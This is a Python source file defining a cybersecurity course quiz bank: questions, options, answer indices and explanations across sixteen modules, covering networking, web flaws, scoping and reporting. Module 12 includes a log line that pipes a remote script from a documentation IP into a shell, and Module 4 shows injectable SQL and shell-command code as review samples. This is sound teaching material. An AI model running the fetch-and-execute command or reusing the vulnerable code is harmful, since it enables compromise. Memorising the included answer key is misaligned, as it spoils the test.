FINAL = []


def F(module, kind, q, options, answer, explain, artifact="", qtype=None):
    ans = answer if isinstance(answer, list) else [answer]
    t = qtype or ("multi" if len(ans) > 1 else ("truefalse" if options == ["True", "False"] else "single"))
    FINAL.append({"module": module, "category": kind, "q": q, "options": options, "answer": ans, "explain": explain, "artifact": artifact.strip("\n"), "type": t})


TFO = ["True", "False"]
# Module 1
F("m01", "objective", "Which component is volatile memory?", ["SSD", "RAM", "UEFI firmware", "HDD"], 1, "RAM loses contents without power.")
F("m01", "objective", "What is 11000000 in decimal?", ["128", "160", "192", "224"], 2, "128 + 64 = 192.")
F("m01", "practical", "A file's first bytes are shown. What type is it?", ["PDF", "PNG", "Windows executable", "ZIP"], 2, "4D 5A = 'MZ' PE header.", "00000000: 4D 5A 90 00 03 00 00 00  MZ......")
F("m01", "objective", "Which virtual network mode keeps vulnerable lab VMs off your home network?", ["Bridged", "Internal/host-only", "NAT with port forwarding", "Public"], 1, "Internal or host-only.")
F("m01", "objective", "Select ALL that are memory-protection techniques.", ["ASLR", "DEP/NX", "DHCP", "Stack canaries"], [0, 1, 3], "DHCP is a network protocol.")
# Module 2
F("m02", "objective", "How many usable hosts does a /26 provide?", ["30", "62", "64", "126"], 1, "64 - 2.")
F("m02", "practical", "What is wrong with this host's configuration?", ["IP not in subnet", "Gateway on a different subnet", "DNS unreachable", "Nothing"], 1, "10.0.2.1 is outside 10.0.1.0/24.", "IP: 10.0.1.50/24\nGateway: 10.0.2.1\nDNS: 10.0.1.53")
F("m02", "objective", "Which protocol maps IP addresses to MAC addresses?", ["DNS", "ARP", "DHCP", "ICMP"], 1, "ARP.")
F("m02", "objective", "Which port does HTTPS use by default?", ["80", "443", "8443", "22"], 1, "443.")
F("m02", "lab", "In the PCAP lab, which display filter shows only FTP traffic?", ["port 21", "ftp", "tcp.ftp == 1", "show ftp"], 1, "Display filter syntax: ftp.")
F("m02", "objective", "Traffic between VLANs must pass through...", ["A hub", "A layer 3 device", "An access point", "A modem"], 1, "Router or L3 switch.")
F("m02", "objective", "Which is NOT an RFC 1918 private range?", ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "172.32.0.0/16"], 3, "172.16-31 only.")
# Module 3
F("m03", "objective", "Which command lists files including hidden ones in long format?", ["ls", "ls -la", "dir /h", "cat -a"], 1, "ls -la.")
F("m03", "practical", "What is the octal permission of this file?", ["644", "640", "750", "755"], 2, "rwx=7, r-x=5, ---=0.", "-rwxr-x--- 1 root ops 1024 script.sh")
F("m03", "lab", "In the Linux Permissions lab, which finding allowed any user to run commands as root?", ["/usr/bin/passwd SUID", "World-writable backup script run by root cron", "Sticky bit on /tmp", ".bashrc readable"], 1, "Writable root cron script.")
F("m03", "objective", "Which Windows event ID indicates the Security log was cleared?", ["4624", "4625", "1102", "7045"], 2, "1102.")
F("m03", "objective", "Which PowerShell cmdlet lists local Administrators?", ["Get-Admins", "Get-LocalGroupMember -Group Administrators", "net view", "whoami /all"], 1, "Get-LocalGroupMember.")
F("m03", "objective", "GPOs are applied in which order?", ["OU, Domain, Site, Local", "Local, Site, Domain, OU", "Site, Local, OU, Domain", "Domain only"], 1, "LSDOU.")
# Module 4
F("m04", "objective", "Which Python collection removes duplicates automatically?", ["list", "tuple", "set", "dict"], 2, "set.")
F("m04", "practical", "What is the vulnerability in this code?", ["XSS", "SQL injection", "Path traversal", "None"], 1, "String-built SQL with user input.", "query = \"SELECT * FROM users WHERE email = '\" + email + \"'\"\ncursor.execute(query)")
F("m04", "objective", "Which DOM property safely inserts untrusted text?", ["innerHTML", "textContent", "outerHTML", "document.write"], 1, "textContent.")
F("m04", "objective", "Where should an API key for a script be stored?", ["Hardcoded", "Environment variable or secrets vault", "In Git", "In a comment"], 1, "Keep secrets out of code.")
F("m04", "lab", "In the Code Review lab, what fixes os.system(\"ping \" + host)?", ["shell=True", "Validate with ipaddress and call subprocess.run(['ping','-c','1',ip])", "Base64 the host", "Add sudo"], 1, "Avoid shell; validate input.")
F("m04", "objective", "An exit code of 0 in Bash means success.", TFO, 0, "0 = success.")
# Module 5
F("m05", "objective", "Ransomware encrypting files primarily affects...", ["Confidentiality", "Integrity", "Availability", "Non-repudiation"], 2, "Availability (often also confidentiality via theft).")
F("m05", "objective", "Which MFA method is most phishing-resistant?", ["SMS", "Email OTP", "FIDO2 security key/passkey", "Security questions"], 2, "FIDO2.")
F("m05", "objective", "To verify a digital signature you use the signer's...", ["Private key", "Public key", "Password", "Session key"], 1, "Public key verifies.")
F("m05", "objective", "Which is best for storing passwords?", ["AES", "MD5", "Argon2/bcrypt", "Base64"], 2, "Slow salted hashes.")
F("m05", "objective", "Buying cyber insurance is which risk treatment?", ["Avoid", "Transfer", "Accept", "Mitigate"], 1, "Transfer.")
F("m05", "lab", "A friend asks you to test their employer's website 'just to check'. What is required first?", ["A fast VPN", "Written authorisation from someone with authority over the system", "Kali Linux", "Nothing if you are careful"], 1, "No authorisation, no test.")
F("m05", "objective", "Select ALL detective controls.", ["IDS", "Log monitoring", "Firewall rule", "CCTV"], [0, 1, 3], "Firewall rules are preventive.")
# Module 6
F("m06", "objective", "Reading certificate transparency logs is...", ["Active recon", "Passive recon", "Exploitation", "Social engineering"], 1, "Third-party public records.")
F("m06", "practical", "What does this DNS record show?", ["Strict email protection", "DMARC in monitoring mode only", "No SPF", "Mail encryption"], 1, "p=none does not enforce.", "_dmarc.example.test TXT \"v=DMARC1; p=none; rua=mailto:d@example.test\"")
F("m06", "lab", "In the Silverline recon lab, shop.silverline.test pointed to a SaaS vendor. Correct action?", ["Test it", "Confirm ownership/permission with client and vendor first", "Ignore scope", "Brute force it"], 1, "Validate ownership.")
F("m06", "objective", "Which tool is best known for graph-based link analysis?", ["Maltego", "Hydra", "Nikto", "John"], 0, "Maltego.")
F("m06", "objective", "A recon item seen once in an unverified source should be labelled...", ["Confirmed", "Probable", "Possible", "Critical"], 2, "Possible.")
F("m06", "objective", "A CNAME pointing to a deleted cloud resource may enable subdomain takeover.", TFO, 0, "Dangling DNS.")
# Module 7
F("m07", "objective", "In a SYN scan, no response usually indicates...", ["Open", "Closed", "Filtered", "Up"], 2, "Firewall dropping.")
F("m07", "practical", "Which service here is the most concerning exposure?", ["22 ssh", "8080 Jenkins without authentication", "53 domain", "443 https"], 1, "Unauthenticated CI.", "22/tcp open ssh OpenSSH 8.9p1\n53/tcp open domain\n443/tcp open https nginx\n8080/tcp open http Jenkins 2.440 (anonymous admin)")
F("m07", "lab", "Which command respected the exclusion in the scanning lab?", ["nmap -sn 10.10.10.0/24", "nmap -sn 10.10.10.0/24 --exclude 10.10.10.200", "nmap -A 10.10.0.0/16", "nmap 10.10.10.200"], 1, "--exclude.")
F("m07", "objective", "Which Nmap option saves output in all major formats?", ["-oN", "-oA", "-sA", "-A"], 1, "-oA.")
F("m07", "objective", "What most reduces vulnerability scan false positives?", ["Faster timing", "Credentialed scanning", "UDP only", "-Pn"], 1, "Credentials.")
F("m07", "objective", "OS fingerprinting results are a best guess, not proof.", TFO, 0, "Confirm with other evidence.")
# Module 8
F("m08", "objective", "A CVSS score of 9.1 is rated...", ["High", "Critical", "Medium", "Low"], 1, "9.0-10.0 Critical.")
F("m08", "practical", "Interpret this vector.", ["Local, high complexity", "Remotely exploitable, no privileges, no user interaction", "Requires physical access", "Only availability impact"], 1, "AV:N, PR:N, UI:N.", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H")
F("m08", "objective", "CISA's KEV catalogue lists...", ["All CVEs", "Vulnerabilities known to be exploited in the wild", "Malware hashes", "Patches"], 1, "KEV.")
F("m08", "lab", "In the CVSS lab, why was the OpenSSL finding on RHEL a false positive?", ["Scanner crashed", "The vendor backported the fix into the installed package", "Port filtered", "It was a zero-day"], 1, "Backporting.")
F("m08", "objective", "Restricting access to a vulnerable service until it is patched is...", ["Remediation", "Mitigation", "Transfer", "Acceptance"], 1, "Mitigation.")
F("m08", "objective", "Which should usually be fixed first?", ["CVSS 9.0 on isolated lab VM", "CVSS 8.1 internet-facing VPN in KEV", "CVSS 5.3 printer", "CVSS 3.1 test server"], 1, "Exposure + exploitation.")
# Module 9
F("m09", "objective", "Changing /invoices/1001 to /invoices/1002 and seeing another user's invoice is...", ["XSS", "IDOR/BOLA", "CSRF", "SSRF"], 1, "Object-level authorisation failure.")
F("m09", "practical", "Which header is missing for clickjacking protection?", ["Content-Type", "X-Frame-Options or CSP frame-ancestors", "Date", "Server"], 1, "Framing controls.", "HTTP/1.1 200 OK\nContent-Type: text/html\nStrict-Transport-Security: max-age=31536000\nX-Content-Type-Options: nosniff")
F("m09", "lab", "In the web lab, what did v2 return for another user's invoice?", ["200 with data", "404 Not Found", "302", "500"], 1, "404.")
F("m09", "objective", "Primary fix for SQL injection?", ["WAF", "Parameterised queries", "Hide errors", "POST requests"], 1, "Prepared statements.")
F("m09", "objective", "Which flaw makes a server fetch attacker-chosen URLs?", ["CSRF", "SSRF", "XSS", "IDOR"], 1, "SSRF.")
F("m09", "objective", "Select ALL CSRF defences.", ["Anti-CSRF tokens", "SameSite cookies", "innerHTML", "Re-authentication for sensitive actions"], [0, 1, 3], "innerHTML is unrelated (and risky for XSS).")
F("m09", "objective", "Number one risk in the OWASP API Security Top 10 2023?", ["Injection", "BOLA", "SSRF", "Logging"], 1, "API1 BOLA.")
# Module 10
F("m10", "objective", "Which phase comes first in a penetration test?", ["Scanning", "Pre-engagement", "Exploitation", "Reporting"], 1, "Scope and authorisation.")
F("m10", "practical", "What does this indicate?", ["Normal", "Password spraying/guessing followed by success", "Printer error", "DNS issue"], 1, "Many 4625 then 4624 from same source.", "02:00-02:05 4625 x180 src=10.1.1.50 multiple users\n02:06 4624 user=jlee src=10.1.1.50 type 3")
F("m10", "objective", "What does LAPS prevent?", ["SQLi", "Lateral movement via shared local admin passwords", "Phishing", "DNS spoofing"], 1, "Unique local passwords.")
F("m10", "objective", "Kerberoasting targets...", ["Browsers", "Service accounts with SPNs and weak passwords", "Printers", "DHCP"], 1, "Offline cracking of service tickets.")
F("m10", "lab", "In the password audit lab, how should results be reported?", ["Full plaintext list", "Statistics and patterns only", "Email to all staff", "Not at all"], 1, "Protect secrets.")
F("m10", "objective", "Which is a Windows-specific privilege escalation category?", ["SUID binaries", "Unquoted service paths", "Cron jobs", "Sticky bit"], 1, "Unquoted service paths.")
F("m10", "objective", "Before running a public exploit you should read and understand its code.", TFO, 0, "Public code can be broken or malicious.")
# Module 11
F("m11", "objective", "Which Wi-Fi security protocol is current best practice?", ["WEP", "WPA", "WPA2-TKIP", "WPA3"], 3, "WPA3.")
F("m11", "practical", "Which network in this survey is likely rogue?", ["SLV-Corp", "SLV-Guest", "SLV-Staff on BSSID 7C:2E:..", "None"], 2, "Not on approved list.", "Approved: A0:3D:6F:11:22:01-03\nA0:3D:6F:11:22:01 SLV-Staff WPA2\nA0:3D:6F:11:22:02 SLV-Corp WPA2-MGT\n7C:2E:BD:99:10:5A SLV-Staff WPA2")
F("m11", "objective", "Where should an Android app store cryptographic keys?", ["SharedPreferences", "Android Keystore", "External storage", "Logcat"], 1, "Keystore.")
F("m11", "lab", "In the mobile lab, android:debuggable=\"true\" in a release build is...", ["Fine", "A finding - allows runtime inspection", "Required", "A performance setting"], 1, "Disable in release.")
F("m11", "objective", "Which OWASP standard defines mobile app security requirements?", ["ASVS", "MASVS", "WSTG", "SAMM"], 1, "MASVS.")
F("m11", "objective", "Hiding the SSID is an effective security control.", TFO, 1, "Hidden SSIDs are easily revealed.")
# Module 12
F("m12", "objective", "A payload is...", ["The vulnerability", "Code/action executed after successful exploitation", "A firewall", "A CVE"], 1, "Payload.")
F("m12", "lab", "During testing you find a web shell your team did not create. You should...", ["Use it", "Stop and notify the emergency contact", "Delete it silently", "Ignore it"], 1, "Real incident.")
F("m12", "objective", "Which is the least impactful evidence for SQL injection?", ["Dump all records", "DB version and row count", "Drop a table", "Modify data"], 1, "Minimal proof.")
F("m12", "practical", "Which line indicates persistence?", ["GET /index.html 200", "CRON (www-data) CMD (curl -s http://198.51.100.23/u.sh | sh)", "sshd: Accepted publickey for admin", "systemd: Started Daily apt"], 1, "Recurring remote script execution.", "Mar 12 02:20 CRON[3188]: (www-data) CMD (curl -s http://198.51.100.23/u.sh | sh)\nMar 12 06:25 systemd: Started Daily apt upgrade")
F("m12", "objective", "Which file helps researchers report vulnerabilities to a website owner?", ["robots.txt", "security.txt", "sitemap.xml", "ads.txt"], 1, "RFC 9116.")
F("m12", "objective", "Evidence should be preserved before wiping a compromised system.", TFO, 0, "Evidence first.")
# Module 13
F("m13", "objective", "What is the security boundary in Active Directory?", ["OU", "Domain", "Forest", "Site"], 2, "Forest.")
F("m13", "practical", "What is wrong with this IAM policy?", ["Nothing", "Grants full admin (Action * Resource *)", "Denies everything", "Syntax error"], 1, "Wildcards violate least privilege.", '{"Effect":"Allow","Action":"*","Resource":"*"}')
F("m13", "objective", "Which mount gives a container effective root on the Docker host?", ["/tmp", "/var/run/docker.sock", "/app", "/etc/hosts"], 1, "Docker socket.")
F("m13", "lab", "In the container lab, where should DB_PASSWORD come from?", ["ENV baked in the image", "A secrets manager / Docker secrets", "Dockerfile comment", "Image label"], 1, "Secret stores.")
F("m13", "objective", "Which JWT alg value must always be rejected?", ["RS256", "ES256", "none", "PS256"], 2, "Unsigned tokens.")
F("m13", "objective", "A secret committed to Git and removed later must still be rotated.", TFO, 0, "History keeps it.")
F("m13", "objective", "Which free NSA tool decompiles binaries?", ["Ghidra", "Wireshark", "Nessus", "Burp"], 0, "Ghidra.")
F("m13", "objective", "Select ALL software supply chain controls.", ["SBOMs", "Signed artefacts", "Pinned dependencies", "Disabling logging"], [0, 1, 2], "Disabling logging weakens security.")
# Module 14
F("m14", "objective", "The executive summary should focus on...", ["Tool output", "Business risk and priorities", "Packet details", "Tester biography"], 1, "Business language.")
F("m14", "lab", "In the finding-writing lab, which remediation is best?", ["Fix the API", "Enforce server-side ownership checks, return 404 for non-owned IDs, add per-role tests", "Use HTTPS", "Hide IDs"], 1, "Specific and verifiable.")
F("m14", "objective", "A finding fixed on one endpoint but present on a variant is...", ["Fixed", "Partially fixed", "Accepted", "Informational"], 1, "Partial fix.")
F("m14", "objective", "Discovered passwords in evidence should be...", ["Shown in full", "Redacted", "Bolded", "Emailed"], 1, "Redact.")
F("m14", "objective", "A verbal request to add systems to scope is sufficient authorisation.", TFO, 1, "Needs written amendment.")
F("m14", "practical", "Which section is missing from this report outline?", ["Findings", "Limitations", "Executive summary", "Scope"], 1, "Limitations state what was not tested.", "1. Executive summary\n2. Scope\n3. Methodology\n4. Findings\n5. Remediation table\n6. Appendices")
# Module 15
F("m15", "objective", "OWASP Juice Shop is...", ["A real shop", "A deliberately insecure training web app", "A firewall", "A CVE database"], 1, "Training target.")
F("m15", "objective", "When should you use a lab hint?", ["Immediately", "After a genuine attempt when stuck", "Never", "Only after the reflection"], 1, "Productive struggle first.")
F("m15", "objective", "Which rubric criterion is gating in this app's projects?", ["Formatting", "Safety and scope compliance", "Speed", "Tool count"], 1, "Safety gate.")
# Module 16
F("m16", "objective", "Which certification is a practical web exam by PortSwigger?", ["CEH", "BSCP", "Security+", "CC"], 1, "Burp Suite Certified Practitioner.")
F("m16", "objective", "STAR stands for...", ["Scan, Test, Attack, Report", "Situation, Task, Action, Result", "Start, Think, Act, Review", "Security, Trust, Access, Risk"], 1, "STAR method.")
F("m16", "objective", "Which role mainly triages alerts in a SOC?", ["Security architect", "SOC analyst", "Red team operator", "DevSecOps"], 1, "SOC analyst.")
F("m16", "objective", "Certification prices and formats should be verified with the provider.", TFO, 0, "They change.")
# Capstone-style integration
F("m14", "lab", "Capstone: which order of remediation is best? VPN KEV, BOLA on shipments, internal unauthenticated Jenkins, DMARC p=none.", ["DMARC, Jenkins, BOLA, VPN", "VPN, BOLA, Jenkins, DMARC", "Jenkins, VPN, DMARC, BOLA", "All equal"], 1, "Exposure + exploitation, then data exposure.")
F("m10", "lab", "Capstone: the IT manager verbally asks for a DoS test on the VPN. You...", ["Run it", "Explain DoS is excluded; require a written amendment", "Run it at night", "Ask an intern"], 1, "Scope discipline.")
F("m07", "practical", "Classify port states from this output.", ["All open", "22 open, 23 closed, 3389 filtered", "All filtered", "22 filtered, 23 open"], 1, "Read the STATE column.", "PORT     STATE    SERVICE\n22/tcp   open     ssh\n23/tcp   closed   telnet\n3389/tcp filtered ms-wbt-server")
F("m02", "practical", "Host 192.168.10.77/27 - what is the broadcast address?", ["192.168.10.63", "192.168.10.95", "192.168.10.127", "192.168.10.255"], 1, "Block 32: 64-95.")
